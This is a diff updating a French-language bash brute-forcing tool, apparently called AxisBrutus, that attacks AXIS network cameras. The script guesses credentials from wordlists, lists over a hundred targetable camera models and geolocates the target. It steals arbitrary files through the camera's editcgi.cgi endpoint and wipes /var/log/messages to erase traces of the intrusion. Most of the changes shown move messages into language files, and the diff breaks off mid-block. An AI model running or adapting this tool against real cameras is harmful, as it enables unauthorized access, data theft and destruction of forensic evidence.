@@ -10,25 +10,18 @@ ab_auteur='CHORFA Alla-eddine'
 ab_date_creation='25.07.2019'
 ab_date_maj=$(/bin/ls -l --time-style=full-iso axisBrutus.sh|cut -d " " -f 6)" "$(/bin/ls -l --time-style=full-iso axisBrutus.sh|cut -d " " -f 7|rev|cut -d ":" -f 2-|rev)
 ab_titre='AxisBrutus'
-ab_ver='2.4'
+ab_ver='2.5'
 ab_contact='h4ckr213dz@gmail.com'
 ab_web='https://github.com/dino213dz/'
 ab_slogan='La plus fine des brutes!'
-ab_slogan_bravo='La brute a encore frappé!'
+ab_slogan_bravo="\t \tLa brute a encore frappé!"
 ab_slogan_defaite="Ce minus a esquivé toutes nos frappes! Donne moi plus de mots-de-passes et plus de logins à manger si tu veux qu'on gagne!"
+
 
 ####################################################################################################################
 #                                                      VARIABLES
 ####################################################################################################################
-dossier_mdps='./cracked'
-mdp_wordlist='./wordlists/axis_mdp.txt'
-users_wordlist='./wordlists/axis_users.txt'
-fichier_mdp_trouve_default="AXIS_~MODELE~-IP_~IP~-INFOS.txt"
-modele_nondetecte='AXIS inconnu inconnu'
-fichier_mdp_trouve=$fichier_mdp_trouve_default
-fichier_logs_defaut='./axisBrutus.log'
-fichier_logs=$fichier_logs_defaut
-tmp='/tmp/axis.html'
+
 
 #Inti. var. styles
 rouge='\033[1;31m'
@@ -45,48 +38,36 @@ magenta='\033[1;35m'
 magenta_fonce='\033[0;35m'
 blanc='\033[1;37m'
 gris='\033[0;37m'
+noir='\033[0;30m'
+fond_rouge='\033[1;41m'
+fond_jaune='\033[1;43m'
+fond_vert='\033[1;42m'
+fond_cyan='\033[1;46m'
+fond_bleu='\033[1;44m'
+fond_magenta='\033[1;45m'
+fond_blanc='\033[1;47m'
+fond_noir='\033[1;40m'
+
 italic='\033[3m'
 souligne='\033[4m'
 reset='\033[0m'
 
+#sources
+source config/axisBrutus.lang
+source config/axisBrutus.conf
 
-#BANNIERES
-#Banniere principale:
-banniere='IOKWhOKWhOKWhCAgICAgIOKWkuKWiOKWiCAgIOKWiOKWiOKWkiDilojilojilpMgIOKWiOKWiOKWiOKWiOKWiOKWiCAg4paE4paE4paE4paEICAgIOKWiOKWiOKWgOKWiOKWiOKWiCAgIOKWiCAgICDilojilogg4paE4paE4paE4paI4paI4paI4paI4paI4paTIOKWiCAgICDilojiloggICDilojilojilojilojilojiloggCuKWkuKWiOKWiOKWiOKWiOKWhCAgICDilpLilpIg4paIIOKWiCDilpLilpHilpPilojilojilpLilpLilojiloggICAg4paSIOKWk+KWiOKWiOKWiOKWiOKWiOKWhCDilpPilojilogg4paSIOKWiOKWiOKWkiDilojiloggIOKWk+KWiOKWiOKWkuKWkyAg4paI4paI4paSIOKWk+KWkiDilojiloggIOKWk+KWiOKWiOKWkuKWkuKWiOKWiCAgICDilpIgCuKWkuKWiOKWiCAg4paA4paI4paEICDilpHilpEgIOKWiCAgIOKWkeKWkuKWiOKWiOKWkuKWkSDilpPilojilojiloQgICDilpLilojilojilpIg4paE4paI4paI4paT4paI4paIIOKWkeKWhOKWiCDilpLilpPilojiloggIOKWkuKWiOKWiOKWkeKWkiDilpPilojilojilpEg4paS4paR4paT4paI4paIICDilpLilojilojilpHilpEg4paT4paI4paI4paEICAgCuKWkeKWiOKWiOKWhOKWhOKWhOKWhOKWiOKWiCAg4paRIOKWiCDilogg4paSIOKWkeKWiOKWiOKWkSAg4paSICAg4paI4paI4paS4paS4paI4paI4paR4paI4paAICDilpLilojilojiloDiloDilojiloQgIOKWk+KWk+KWiCAg4paR4paI4paI4paR4paRIOKWk+KWiOKWiOKWkyDilpEg4paT4paT4paIICDilpHilojilojilpEgIOKWkiAgIOKWiOKWiOKWkgog4paT4paIICAg4paT4paI4paI4paS4paS4paI4paI4paSIOKWkuKWiOKWiOKWkuKWkeKWiOKWiOKWkeKWkuKWiOKWiOKWiOKWiOKWiOKWiOKWkuKWkuKWkeKWk+KWiCAg4paA4paI4paT4paR4paI4paI4paTIOKWkuKWiOKWiOKWkuKWkuKWkuKWiOKWiOKWiOKWiOKWiOKWkyAgIOKWkuKWiOKWiOKWkiDilpEg4paS4paS4paI4paI4paI4paI4paI4paTIOKWkuKWiOKWiOKWiOKWiOKWiOKWiOKWkuKWkgog4paS4paSICAg4paT4paS4paI4paR4paS4paSIOKWkSDilpHilpMg4paR4paR4paTICDilpIg4paS4paT4paSIOKWkiDilpHilpHilpLilpPilojilojilojiloDilpLilpEg4paS4paTIOKWkeKWkuKWk+KWkeKWkeKWkuKWk+KWkiDilpIg4paSICAg4paSIOKWkeKWkSAgIOKWkeKWkuKWk+KWkiDilpIg4paSIOKWkiDilpLilpPilpIg4paSIOKWkQogIOKWkiAgIOKWkuKWkiDilpHilpHilpEgICDilpHilpIg4paRIOKWkiDilpHilpEg4paR4paSICDilpEg4paR4paS4paR4paSICAg4paRICAg4paR4paSIOKWkSDilpLilpHilpHilpHilpLilpEg4paRIOKWkSAgICAg4paRICAgIOKWkeKWkeKWkuKWkSDilpEg4paRIOKWkSDilpHilpIgIOKWkSDilpEKICDilpEgICDilpIgICAg4paRICAgIOKWkSAgIOKWkiDilpHilpEgIOKWkSAg4paRICAg4paRICAgIOKWkSAgIOKWkeKWkSAgIOKWkSAg4paR4paR4paRIOKWkSDilpEgICDilpEgICAgICAg4paR4paR4paRIOKWkSDilpEg4paRICDilpEgIOKWkSAgCiAgICAgIOKWkSAg4paRIOKWkSAgICDilpEgICDilpEgICAgICAgIOKWkSAgIOKWkSAgICAgICAgIOKWkSAgICAgICAg4paRICAgICAgICAgICAgICAgICDilpEgICAgICAgICAgIOKWkSAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg4paRICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAo='
-#Banniere dino213dz
-banniere_dino213dz='X19fX19fX18gIC5fX18gX19fX19fXyAgIF9fX19fX19fICAgX19fX19fX18gIF9fX19fX19fX19fXyBfX19fX19fXyAgX19fX19fX19fXwpcX19fX19fIFwgfCAgIHxcICAgICAgXCAgXF9fX19fICBcICBcX19fX18gIFwvXyAgIFxfX19fXyAgXFxfX19fX18gXCBcX19fXyAgICAvCiB8ICAgIHwgIFx8ICAgfC8gICB8ICAgXCAgLyAgIHwgICBcICAvICBfX19fLyB8ICAgfCBfKF9fICA8IHwgICAgfCAgXCAgLyAgICAgLyAKIHwgICAgYCAgIFwgICAvICAgIHwgICAgXC8gICAgfCAgICBcLyAgICAgICBcIHwgICB8LyAgICAgICBcfCAgICBgICAgXC8gICAgIC9fIAovX19fX19fXyAgL19fX1xfX19ffF9fICAvXF9fX19fX18gIC9cX19fX19fXyBcfF9fXy9fX19fX18gIC9fX19fX19fICAvX19fX19fXyBcCiAgICAgICAgXC8gICAgICAgICAgICBcLyAgICAgICAgIFwvICAgICAgICAgXC8gICAgICAgICAgIFwvICAgICAgICBcLyAgICAgICAgXC8K'
-#Banniere fichier export
-banniere_export='ICBfXyAgIF8gIF8gIF9fICBfX19fICBfX19fICBfX19fICBfICBfICBfX19fICBfICBfICBfX19fIAogLyBfXCAoIFwvICkoICApLyBfX18pKCAgXyBcKCAgXyBcLyApKCBcKF8gIF8pLyApKCBcLyBfX18pCi8gICAgXCApICAoICApKCBcX19fIFwgKSBfICggKSAgIC8pIFwvICggICkoICApIFwvIChcX19fIFwKXF8vXF8vKF8vXF8pKF9fKShfX19fLyhfX19fLyhfX1xfKVxfX19fLyAoX18pIFxfX19fLyhfX19fLwo='
-#Banniere effacementLogs:
-#droid
-banniere_logs='ICAgICAgICAgICAgICAuYW5kQUhIQWJubi4KICAgICAgICAgICAuYUFISEhBQVVVQUFISEhBbi4KICAgICAgICAgIGRIUF5+IiAgICAgICAgIn5eVEhiLgogICAgLiAgIC5BSEYgICAgICAgICAgICAgICAgWUhBLiAgIC4KICAgIHwgIC5BSEhiLiAgICAgICAgICAgICAgLmRISEEuICB8CiAgICB8ICBISEFVQUFIQWJuICAgICAgYWRBSEFBVUFIQSAgfAogICAgSSAgSEZ+Il9fX19fICAgICAgICBfX19fIF1ISEggIEkKICAgSEhJIEhBUEsiIn5eWVVIYiAgZEFISEhISEhISEhIIElISAogICBISEkgSEhIRD4gLmFuZEhIICBISFVVUF5+WUhISEggSUhICiAgIFlVSSBdSEhQICAgICAiflkgIFB+IiAgICAgVEhIWyBJVVAKICAgICIgIGBISyAgICAgICAgICAgICAgICAgICBdSEgnICAiCiAgICAgICAgVEhBbi4gIC5kLmFBQW4uYi4gIC5kSEhQCiAgICAgICAgXUhISEhBQVVQIiB+fiAiWVVBQUhISEhbCiAgICAgICAgYEhIUF5+IiAgLmFubm4uICAifl5ZSEgnCiAgICAgICAgIFlIYiAgICB+IiAiIiAifiAgICBkSEYKICAgICAgICAgICJZQWIuLmFiZEhIYm5kYm5kQVAiCiAgICAgICAgICAgVEhIQUFiLiAgLmFkQUhIRgogICAgICAgICAgICAiVUhISEhISEhISEhVIgogICAgICAgICAgICAgIF1ISFVVSEhISEhIWwogICAgICAgICAgICAuYWRISGIgIkhISEhIYm4uCiAgICAgLi5hbmRBQUhISEhISGIuQUhISEhISEhBQWJubi4uCi5uZEFBSEhISEhIVVVISEhISEhISEhIVVBefiJ+XllVSEhIQUFibi4KICAifl5ZVUhIUCIgICAifl5ZVUhIVVAiICAgICAgICAiXllVUF4iCiAgICAgICAiIiAgICAgICAgICJ+fiIK'
-#Banniere diverses:
-#bravo
-banniere_bravo='4paE4paE4paE4paEwrcg4paE4paE4paEICAg4paE4paE4paEwrcgIOKWjCDilpDCtyAgICAgIOKWhOKWhCAK4paQ4paIIOKWgOKWiOKWquKWgOKWhCDilojCt+KWkOKWiCDiloDilogg4paq4paIwrfilojilozilqogICAgIOKWiOKWiOKWjArilpDilojiloDiloDilojiloTilpDiloDiloDiloQg4paE4paI4paA4paA4paIIOKWkOKWiOKWkOKWiOKAoiDiloTilojiloDiloQg4paQ4paIwrcK4paI4paI4paE4paq4paQ4paI4paQ4paI4oCi4paI4paM4paQ4paIIOKWquKWkOKWjCDilojilojilogg4paQ4paI4paMLuKWkOKWjC7iloAgCsK34paA4paA4paA4paAIC7iloAgIOKWgCDiloAgIOKWgCAuIOKWgCAgIOKWgOKWiOKWhOKWgOKWqiDiloAgCg=='
-banniere_bravo='IF9fX19fXyAgICAgX19fX19fICAgICBfX19fX18gICAgIF9fICAgX18gICBfX19fX18gICAgCi9cICA9PSBcICAgL1wgID09IFwgICAvXCAgX18gXCAgIC9cIFwgLyAvICAvXCAgX18gXCAgIApcIFwgIF9fPCAgIFwgXCAgX188ICAgXCBcICBfXyBcICBcIFwgXCcvICAgXCBcIFwvXCBcICAKIFwgXF9fX19fXCAgXCBcX1wgXF9cICBcIFxfXCBcX1wgIFwgXF9ffCAgICBcIFxfX19fX1wgCiAgXC9fX19fXy8gICBcL18vIC9fLyAgIFwvXy9cL18vICAgXC9fLyAgICAgIFwvX19fX18vIAo='
-banniere_tryagain='IF9fX19fXyAgIF9fX19fXyAgICAgX18gIF9fICAgICAgICBfX19fX18gICAgIF9fX19fXyAgICAgX19fX19fICAgICBfXyAgICAgX18gICBfXyAgICAKL1xfXyAgX1wgL1wgID09IFwgICAvXCBcX1wgXCAgICAgIC9cICBfXyBcICAgL1wgIF9fX1wgICAvXCAgX18gXCAgIC9cIFwgICAvXCAiLS5cIFwgICAKXC9fL1wgXC8gXCBcICBfXzwgICBcIFxfX19fIFwgICAgIFwgXCAgX18gXCAgXCBcIFxfXyBcICBcIFwgIF9fIFwgIFwgXCBcICBcIFwgXC0uICBcICAKICAgXCBcX1wgIFwgXF9cIFxfXCAgXC9cX19fX19cICAgICBcIFxfXCBcX1wgIFwgXF9fX19fXCAgXCBcX1wgXF9cICBcIFxfXCAgXCBcX1xcIlxfXCAKICAgIFwvXy8gICBcL18vIC9fLyAgIFwvX19fX18vICAgICAgXC9fL1wvXy8gICBcL19fX19fLyAgIFwvXy9cL18vICAgXC9fLyAgIFwvXy8gXC9fLyAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAK'
-#aide
-banniere_aide=$banniere_export
-
-taille_barre_progression=40
-barre_car_fait="■"
-barre_car_restant="■"
-barre_col_fait="\033[0m\033[1;42;32m"
-barre_col_restant="\033[0m\033[0;44;36m"
-barre_col_texte="\033[1;33m"
+modele_nondetecte='AXIS inconnu inconnu'
+fichier_mdp_trouve=$fichier_mdp_trouve_default
+fichier_logs=$fichier_logs_defaut
+horodate="$(/bin/date "+%s")"
 
 #Inti. var. travail
-curl_timeout_default=5
 curl_timeout=$curl_timeout_default
-curl_maxtime_default=10
 curl_maxtime=$curl_maxtime_default
-ping_timeout_default=10
 ping_timeout=$ping_timeout_default
 min_timeout=3
 succes='Administration'
 echec='Unauthorized'
-msg_succes="Authentification réussie! ([P4wn3d])"
-msg_echec="Echec de l'authentification!"
 heure_depart=$(/bin/date +%s)
 mdp_trouve=''
 echec_js=''
@@ -100,11 +81,10 @@ modeles_verifie=''
 urlforced=''
 exportforced=''
 args=("$@")
-#args=(${args[@]} "fin" ) # ajotuer un dernier argument
 nb_args=$#
 
 #liste des modeles testés
-liste_modeles_verifies=("205" "206" "207" "207W" "207MW" "209FD" "209MFD" "210" "211" "211M" "212" "213" "214" "215" "221" "223M" "225FD" "233D" "243SA" "240Q" "241Q" "241S" "247S" "2100" "2110" "2120" "2401+" "F44" "M1004-W" "M1011" "M1011-W" "M1013" "M1014" "M1025" "M1031-W" "M1034-W" "M1054" "M1065-L" "M1104" "M1113" "M1114" "M1124" "M1125" "M20" "M2025-LE" "M3004" "M3005" "M3006" "M3007" "M3011" "M3024-L" "M3025" "M3026" "M3027" "M3045-V" "M3104-LVE" "M3113" "M3204" "M5014" "M5014-V" "M7001" "M7011" "M7014" "M7016" "P12" "P12/M20" "P1343" "P1344" "P1346" "P1347" "P1354" "P1355" "P1357" "P1365" "P1405-LE" "P1425-E" "P1427-LE" "P1428-E" "P3224-LV" "P3225-LVE" "P3304" "P3343" "P3344" "P3346" "P3354" "P3363" "P3364" "P3364-L" "P3365" "P3367" "P5414-E" "P5415-E" "P5512" "P5512-E" "P5532" "P5532-E" "P5534-E" "P5635-E" "P7214" "Q1604" "Q1755" "Q1765-LE" "Q1775" "Q6032-E" "Q6034-E" "Q6035-E" "Q6042" "Q6042-E" "Q6044-E" "Q6045-E" "Q6054-E" "Q6055-E" "Q6128-E" "Q7401")
+liste_modeles_verifies=("205" "206" "207" "207W" "207MW" "209FD" "209MFD" "210" "210A" "211" "211M" "212" "213" "214" "215" "221" "223M" "225FD" "233D" "243SA" "240Q" "241Q" "241S" "247S" "2100" "2110" "2120" "2401" "2401+" "F44" "M1004-W" "M1011" "M1011-W" "M1013" "M1014" "M1025" "M1031-W" "M1034-W" "M1054" "M1065-L" "M1104" "M1113" "M1114" "M1124" "M1125" "M20" "M2025-LE" "M3004" "M3005" "M3006" "M3007" "M3011" "M3024-L" "M3025" "M3026" "M3027" "M3045-V" "M3104-LVE" "M3113" "M3204" "M5014" "M5014-V" "M7001" "M7011" "M7014" "M7016" "P12" "P12/M20" "P1343" "P1344" "P1346" "P1347" "P1354" "P1355" "P1357" "P1365" "P1405-LE" "P1425-E" "P1427-LE" "P1428-E" "P3224-LV" "P3225-LVE" "P3304" "P3343" "P3344" "P3346" "P3354" "P3363" "P3364" "P3364-L" "P3365" "P3367" "P5414-E" "P5415-E" "P5512" "P5512-E" "P5532" "P5532-E" "P5534-E" "P5635-E" "P7214" "Q1604" "Q1755" "Q1765-LE" "Q1775" "Q6032-E" "Q6034-E" "Q6035-E" "Q6042" "Q6042-E" "Q6044-E" "Q6045-E" "Q6054-E" "Q6055-E" "Q6128-E" "Q7401")
 
 ####################################################################################################################
 #                                                       FONCTIONS
@@ -272,13 +252,13 @@ function infosGeolocalisation {
 	infosDbIpDotCom=${infosDbIpDotCom//'"'/''}	
 	
 	#Traduction
-	infosDbIpDotCom=${infosDbIpDotCom/'continentCode:'/'Code continent:'}
-	infosDbIpDotCom=${infosDbIpDotCom/'continentName:'/'Continent:'}
-	infosDbIpDotCom=${infosDbIpDotCom/'countryCode:'/'Code pays:'}
-	infosDbIpDotCom=${infosDbIpDotCom/'countryName:'/'Pays:'}
-	infosDbIpDotCom=${infosDbIpDotCom/'stateProvCode:'/'Code état:'}
-	infosDbIpDotCom=${infosDbIpDotCom/'stateProv:'/'Département/Etat:'}
-	infosDbIpDotCom=${infosDbIpDotCom/'city:'/'Ville/Commune:'}
+	infosDbIpDotCom=${infosDbIpDotCom/'continentCode:'/"$geo_continentCode:"}
+	infosDbIpDotCom=${infosDbIpDotCom/'continentName:'/"$geo_continentName:"}
+	infosDbIpDotCom=${infosDbIpDotCom/'countryCode:'/"$geo_countryCode:"}
+	infosDbIpDotCom=${infosDbIpDotCom/'countryName:'/"$geo_countryName:"}
+	infosDbIpDotCom=${infosDbIpDotCom/'stateProvCode:'/"$geo_stateProvCode:"}
+	infosDbIpDotCom=${infosDbIpDotCom/'stateProv:'/"$geo_stateProv:"}
+	infosDbIpDotCom=${infosDbIpDotCom/'city:'/"$geo_city:"}
 
 	echo $infosDbIpDotCom
 	}
@@ -319,11 +299,11 @@ function effacerTraces {
 	
 	fichiers_a_vider=('/var/log/messages' '/var/log/messages.old')
 
-	fichier_temp='/tmp/fichier_vole.txt'	
+	fichier_temp='/tmp/fichier_vole_'$horodate'.txt'	
 	contenu=$(echo -e $banniere_logs|base64 -d)
 	
 	for fic_a_vid in ${fichiers_a_vider[*]} ;do
-		/usr/bin/curl -ks "http://$ip_cam/admin-bin/editcgi.cgi?file=$fic_a_vid" -d "save_file=$fic_a_vid&mode=0100666&convert_crlf_to_lf=on&submit= Save file &content=$contenu" --connect-timeout $curl_timeout --max-time $curl_maxtime --user $user:$mdp > $fichier_temp 
+		/usr/bin/curl -ks "http://$ip_cam/admin-bin/editcgi.cgi?file=$fic_a_vid" -d "save_file=$fic_a_vid&mode=0100666&concol_succes_crlf_to_lf=on&submit= Save file &content=$contenu" --connect-timeout $curl_timeout --max-time $curl_maxtime --user $user:$mdp > $fichier_temp 
 	done
 	
 	}
@@ -333,7 +313,7 @@ function effacerTraces {
 function voleFichier {
 	ip_cam=$1
 	fichier_a_voler=$2
-	fichier_temp='/tmp/fichier_vole.txt'
+	fichier_temp='/tmp/fichier_vole_'$horodate'.txt'
 	url_vole="http://$ip_cam/admin-bin/editcgi.cgi?file=$fichier_a_voler"
 	/usr/bin/curl -ks --connect-timeout $curl_timeout --max-time $curl_maxtime "$url_vole" --user $user:$mdp  > $fichier_temp #silent_get=$()
 	fichier_vole=''
@@ -399,10 +379,9 @@ function logEnteteCheck {
 		check='OK'
 	else
 		check='ERROR'
-		echo -e "DATE		HEURE		IP:PORT			CATEGORIE	MESSAGE\n--------	--------	----------------	-----------	----------------------------------" > $fichier_logs
+		echo -e $logs_labels > $fichier_logs
 	fi
-	
-	#echo "{"$premiere_ligne"/"$check"}"
+
 	}
 
 #FUNCTION:
@@ -496,7 +475,7 @@ for no_arg in $(seq 0 $nb_args); do
 		fi
 		#lister les modeles testés
 		if [ "$valeur" = "--list" ] || [ "$valeur" = "-l" ];then
-			echo -e "# Liste des modeles testés et validés: "${#liste_modeles_verifies[*]}" au total!"
+			echo -e "# "${models_list_title//"__TOTALMODELS__"/${#liste_modeles_verifies[*]}}""
 			for mod in ${liste_modeles_verifies[*]}; do
 				echo -e " - AXIS $mod Network Camera"
 			done
@@ -597,9 +576,9 @@ fi
 
 #Si aucun cible n'est precisée : on quite en affichant un message d'erreur
 if [ ${#ip} -eq 0 ];then
-	echo -e "ERREUR!"
-	echo -e " Vous devez specifier une cible avec l'argument '--cible ou -c'.\nExemple: $0 --cible 127.45.63.89"
-	echo -e " Vous pouvez afficher l'aide avec l'argument '--help' ou '-h'."
+	echo -e "$vocab_error!"
+	echo -e " $err_no_cible '--cible $vocab_or -c'.\n$vocab_example: $0 --cible 127.45.63.89"
+	echo -e " $err_msg_aff_aide '--help' $vocab_or '-h'."
 	exit
 fi
 
@@ -611,7 +590,7 @@ liste_fichiers_a_verifier=( "$users_wordlist" "$mdp_wordlist" )
 for fichier in ${liste_fichiers_a_verifier[*]}; do
 	test_fichier=$(fichierExiste $fichier)
 	if [ "$test_fichier" != 'OUI' ];then
-		echo -e "$rouge>ERREUR: Le fichier suivant n'a pas été trouvé :\n$vert_fonce$italic$fichier"
+		echo -e "$col_erreur>$vocab_error: $err_fichier_introuvable :\n$col_script$italic$fichier"
 		exit
 	fi
 done
@@ -632,48 +611,48 @@ nb_combinaisons=$(($nb_users*$nb_mdp))
 clear
 
 if [ "$checkOnly" != "OUI" ];then
-	logMessage "#################### Démarrage : $nb_combinaisons combinaisons possibles ####################" "INFORMATION" 
+	logMessage ""${logs_msg_start//"__NBCOMBINAISONS__"/$nb_combinaisons}"" "$logs_type_info" # 
 else
-	logMessage "#################### Verifications uniquement : ####################" "INFORMATION" 
+	logMessage ""$logs_msg_verif"" "$logs_type_info"
 fi
 
 #banniere
-echo -en $rouge_fonce
+echo -en $col_logo
 echo -en $banniere|base64 -d
 
 
 #Version
-texte_ver="Version $ab_ver ¤"
+texte_ver="$vocab_version $ab_ver $puce_banner"
 espaces=$(ajouterEspacesSlogans "$texte_ver")
-echo -e $rouge$espaces$texte_ver
+echo -e $col_texte_version$espaces$texte_ver
 
 #slogan
 #texte_slogan="$ab_slogan$ab_ver"' Version '
 #espaces=$(ajouterEspacesSlogans "$texte_slogan")
-#echo -e $rouge_fonce' Version '$ab_ver$espaces$ab_slogan
+#echo -e $col_logo' Version '$ab_ver$espaces$ab_slogan
 
 
 #slogan V2
-texte_slogan="$ab_slogan ¤"
+texte_slogan="$ab_slogan $puce_banner"
 espaces=$(ajouterEspacesSlogans "$texte_slogan")
-echo -e $rouge_fonce$espaces$texte_slogan
+echo -e $col_texte_slogan$espaces$texte_slogan
 
 #auteur
-texte_auteur="Par $ab_auteur ¤"
+texte_auteur="$vocab_by $ab_auteur $puce_banner"
 espaces=$(ajouterEspacesSlogans "$texte_auteur")
-echo -en $jaune_fonce
+echo -en $col_texte_auteur
 echo -e $espaces$texte_auteur
 
 #mail
-texte_mail="$ab_contact ¤"
+texte_mail="$ab_contact $puce_banner"
 espaces=$(ajouterEspacesSlogans "$texte_mail")
-echo -en $vert_fonce
+echo -en $col_texte_mail
 echo -e $espaces$texte_mail
 
 #wab
-texte_web="$ab_web ¤"
+texte_web="$ab_web $puce_banner"
 espaces=$(ajouterEspacesSlogans "$texte_web")
-echo -en $cyan_fonce
+echo -en $col_texte_web
 echo -e $espaces$texte_web
 
 
@@ -681,33 +660,33 @@ echo -e $espaces$texte_web
 #                                            VERFIFICATIONS DES DEPENDENCES
 ####################################################################################################################
 
-echo -e "$jaune_fonce\n$souligne"'VERFIFICATIONS DES DEPENDENCES:'$reset
+echo -e "$col_section\n$souligne$section_dependences:"$reset
 
 
-echo -e "$jaune[+] Commandes : $cyan"
+echo -e "$col_titre$puce_level_1$element_commandes : $col_texte"
 #curl
 ping_existe=$(command -v ping)
 curl_existe=$(command -v curl)
 if [ ${#ping_existe} -gt 0 ];then
 	ping_existe="OUI"
-	echo -e "$jaune |_[-] Ping :$vert OK!"
+	echo -e "$col_titre$puce_level_2$element_commandes_ping :$col_succes $vocab_ok"
 else
 	ping_existe="NON"
-	echo -e "$jaune |_[-] Ping :$rouge NON!"
-	echo -e "$jaune |  |_[-] Solution :$cyan apt install net-tools"
+	echo -e "$col_titre$puce_level_2$element_commandes_ping :$col_erreur $vocab_ko"
+	echo -e "$col_titre | $puce_level_2$vocab_solution :$col_texte apt install net-tools"
 fi
 if [ ${#curl_existe} -gt 0 ];then
 	curl_existe="OUI"
-	echo -e "$jaune |_[-] Curl :$vert OK!"
+	echo -e "$col_titre$puce_level_2$element_commandes_curl :$col_succes $vocab_ok"
 else
 	curl_existe="NON"
-	echo -e "$jaune |_[-] Curl :$rouge NON!"
-	echo -e "$jaune |  |_[-] Solution :$cyan apt install curl"
+	echo -e "$col_titre$puce_level_2$element_commandes_curl :$col_erreur $vocab_ko"
+	echo -e "$col_titre | $puce_level_2$vocab_solution :$col_texte apt install curl"
 fi
 
 if [ "$ping_existe" != "OUI" ] || [ "$curl_existe" != "OUI" ] ;then
-	echo -e "$jaune |_[-] Erreur :$rouge Dependences non satisfaites"
-	echo -e "$jaune |_[-] Erreur :$rouge On quitte..."
+	echo -e "$col_titre$puce_level_2$vocab_error :$col_erreur $err_dependences"
+	echo -e "$col_titre$puce_level_2$vocab_error :$col_erreur $err_quit"
 	exit
 fi
 ####################################################################################################################
@@ -715,212 +694,220 @@ fi
 ####################################################################################################################
 
 
-echo -e "$jaune_fonce\n$souligne"'PARAMETRES:'$reset
+echo -e "$col_section\n$souligne$section_parametres:$reset"
 
-echo -e "$jaune[+] Cible : $cyan$ip"
+echo -e "$col_titre$puce_level_1$element_param : $col_texte$ip"
 if [ "$checkOnly" != "OUI" ];then
-	echo -e "$jaune[+] List des mot-de-passe:$cyan $mdp_wordlist $jaune"
-	echo -e "$jaune[+] List des usernames:$cyan $users_wordlist $jaune"
-	echo -e "$jaune[+] Total usernames:$cyan$nb_users"
-	echo -e "$jaune[+] Total mot-de-passes:$cyan$nb_mdp"
-	echo -e "$jaune[+] Nombre de combinaisons:$cyan"$nb_combinaisons
-fi
-if [ $curl_timeout -ne $curl_timeout_default ] || [ $curl_maxtime -ne $curl_maxtime_default ];then
-	echo -e "$jaune[+] TTL Requêtes HTTP: $cyan curl timeout=$curl_timeout, curl maxtime=$curl_maxtime"
+	echo -e "$col_titre$puce_level_1$element_param_dicos:"
+	echo -e "$col_titre$puce_level_2$element_param_dicos_list_mdp:$col_texte $mdp_wordlist $col_remarque($col_succes$nb_mdp$col_remarque)"
+	echo -e "$col_titre$puce_level_2$element_param_dicos_list_users:$col_texte $users_wordlist $col_remarque($col_succes$nb_users$col_remarque)"
+	echo -e "$col_titre$puce_level_2$element_param_dicos_nb_combinaisons:$col_succes $nb_combinaisons"
 fi
 
 if [ "$skipModeleDetect" = "OUI" ];then
-	echo -e "$jaune[+] Detection du modele:$cyan Désactivée"
+	echo -e "$col_titre$puce_level_1$element_param_modele_detect:$col_texte $vocab_disabled"
 fi
 
 if [ $ping_timeout -ne $ping_timeout_default ];then
-	echo -e "$jaune[+] Ping timeout:$cyan $ping_timeout"
+	echo -e "$col_titre$puce_level_1$element_param_ping_timeout:$col_texte $ping_timeout"
 fi
 
 if [ "$noPing" = "OUI" ];then
-	echo -e "$jaune[+] Test de connectivité:$cyan Ignorer le résultat du ping"
+	echo -e "$col_titre$puce_level_1$element_param_test_co:$col_texte $element_param_ping_timeout_value"
 fi
 
 if [ "$checkOnly" = "OUI" ];then
-	echo -e "$jaune[+] Attaque désactivée:$cyan Verifications du modele uniquement"
+	echo -e "$col_titre$puce_level_1$element_param_attack_only:$col_texte $element_param_attack_only_value"
 fi
 
 if [ "$urlforced" = "OUI" ];then
-	echo -e "$jaune[+] URI imposée:$cyan $targeturi"
+	echo -e "$col_titre$puce_level_1$element_param_uri_forced:$col_texte $targeturi"
 fi
 
 if [ "$skipGeo" = "OUI" ];then
-	echo -e "$jaune[+] Geolocalisation:$cyan Désactivée"
+	echo -e "$col_titre$puce_level_1$element_param_geolocalisation:$col_texte $vocab_disabled"
 fi
 
 if [ "$fichier_logs" != "$fichier_logs_defaut" ];then
-	echo -e "$jaune[+] Fichier log:$cyan $fichier_logs"
+	echo -e "$col_titre$puce_level_1$element_param_fic_logs:$col_texte $fichier_logs"
 fi
 
+if [ $curl_timeout -ne $curl_timeout_default ] || [ $curl_maxtime -ne $curl_maxtime_default ];then
+	echo -e "$col_titre$puce_level_1$element_param_ttl: $col_texte curl timeout=$curl_timeout, curl maxtime=$curl_maxtime"
+fi
 
 if [ "$checkOnly" != "OUI" ];then
-	logMessage "Fichier usernames : $users_wordlist" "INFORMATION" 
-	logMessage "Fichier mots-de-passe : $mdp_wordlist" "INFORMATION" 
+	logMessage "$logs_fic_usernames: $users_wordlist" "$logs_type_info" 
+	logMessage "$logs_fic_mdp: $mdp_wordlist" "$logs_type_info" 
 fi
 ####################################################################################################################
 #                                                 TEST DE CONNECTIVITE
 ####################################################################################################################
 
-echo -e "$jaune_fonce\n$souligne"'TEST DE CONNECTIVITE:'$reset
+echo -e "$col_section\n$souligne$section_testConnectivite:$reset"
 
-echo -e "$jaune[+] Test en cours :$cyan ping $ip_only..."
-test_connectivite=$(checkConnectiviteCible)
-if [ "$test_connectivite" = "SUCCES" ];then
-	echo -e "$jaune |_[-] Resultat :$vert OK!"
-else
-	logMessage "Ne repond pas au pings" "ERREUR!!!"
-	echo -e "$jaune |_[-] Resultat :$rouge ECHEC!"
-	if [ "$noPing" != "OUI" ];then
-		echo -e "$jaune |_[-] Pas d'attaque à faire :$rouge On quitte"
-		exit
+if [ "$noPing" != "OUI" ];then
+	echo -e "$col_titre$puce_level_1$element_testco :$col_texte ping $ip_only..."
+	test_connectivite=$(checkConnectiviteCible)
+	if [ "$test_connectivite" = "SUCCES" ];then
+		echo -e "$col_titre$puce_level_2$vocab_results :$col_succes $vocab_ok"
 	else
-		echo -e "$jaune |_[-] On attaque quand même:$rouge On ignore le résultat du ping"
-		logMessage "On ignore le résultat du ping" "ERREUR!!!"
-		
+		logMessage "$element_testco_noresponse" "$logs_type_error"
+		echo -e "$col_titre$puce_level_2$vocab_results :$col_erreur $vocab_echec"
+		if [ "$noPing" != "OUI" ];then
+			echo -e "$col_titre$puce_level_2$err_ping :$col_erreur $err_exit"
+			exit
+		else
